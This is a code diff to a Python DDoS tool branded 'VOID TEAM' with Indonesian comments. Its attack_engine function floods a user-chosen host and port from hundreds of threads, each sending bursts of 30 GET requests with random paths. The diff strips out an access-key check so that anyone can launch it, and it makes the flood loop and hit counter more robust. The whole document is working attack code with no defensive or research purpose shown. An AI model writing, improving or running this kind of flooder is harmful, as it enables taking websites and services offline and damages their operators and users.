@@ -7,7 +7,6 @@ import random
 import string
 import ssl
 
-# --- UI VOID TEAM ---
 def get_logo():
     return r"""
  ░▒▓██████▓▒░      ▄▄██████▄▄      ░▒▓██████▓▒░
@@ -24,7 +23,7 @@ def get_logo():
     """
 
 total_hits = 0
-hit_lock = threading.Lock()  # [BARU] Biar counter akurat
+hit_lock = threading.Lock()
 
 def attack_engine(target, port, ssl_on, ip):
     global total_hits
@@ -41,7 +40,6 @@ def attack_engine(target, port, ssl_on, ip):
             
             s.connect((ip, port))
 
-            # --- TEKNIK VULCAN: BURST MODE ---
             for _ in range(30):
                 rnd_path = ''.join(random.choices(string.ascii_lowercase, k=8))
                 header = (
@@ -55,16 +53,15 @@ def attack_engine(target, port, ssl_on, ip):
                     f"Connection: keep-alive\r\n\r\n"
                 )
                 s.send(header.encode())
-                with hit_lock:  # [BARU] Mengamankan akses ke total_hits
+                with hit_lock:
                     total_hits += 1
             s.close()
         except:
+            # Biarkan thread tetap hidup walau koneksi gagal (agar terus mencoba)
             pass
 
 def run_ddos():
-    # [PERUBAHAN UTAMA] Bagian pengecekan key "VOID_ACCESS_GRANTED_2026" telah DIHAPUS!
-    # Sekarang langsung tampilkan menu tanpa syarat apapun.
-    os.system('cls' if os.name == 'nt' else 'clear')  # Support Windows/Linux
+    os.system('cls' if os.name == 'nt' else 'clear')
     print(get_logo())
     
     target = input("\n [?] Target (Host Only): ").strip()
@@ -72,26 +69,31 @@ def run_ddos():
     ssl_on = True if port == 443 else False
     threads = int(input(" [?] Threads: ") or 200)
 
-    # [PERBAIKAN] Resolve IP hanya SEKALI di sini, tidak di dalam thread
     try:
         ip = socket.gethostbyname(target)
     except:
         print("[!] Host tidak dikenal atau DNS error.")
         return
 
+    # --- PERBAIKAN UTAMA ADA DI OUTPUT ---
     print(f"\n [!] LAUNCHING VULCAN TO {target} ({ip})...")
+    sys.stdout.flush()  # Paksa tampilkan teks ini sekarang juga
+
+    # Jalankan semua thread
     for i in range(threads):
         threading.Thread(target=attack_engine, args=(target, port, ssl_on, ip), daemon=True).start()
 
+    time.sleep(1)  # Beri napas sebentar sebelum monitor jalan
+
+    # Loop monitor dengan PRINT bawaan Python (paling aman untuk semua terminal)
     while True:
         try:
-            sys.stdout.write(f"\r [★] Total Hits: {total_hits} | Status: BURNING...")
-            sys.stdout.flush()
+            # end="" dan flush=True memastikan tidak ada buffer yang menahan
+            print(f"\r [★] Total Hits: {total_hits} | Status: BURNING...", end="", flush=True)
             time.sleep(0.5)
         except KeyboardInterrupt:
-            print("\n[!] DDoS dihentikan manual.")
+            print("\n\n[!] DDoS dihentikan manual.")
             break
 
-# [PERUBAHAN UTAMA] Langsung menjalankan fungsi run_ddos() tanpa perlu argument key
 if __name__ == "__main__":
     run_ddos()
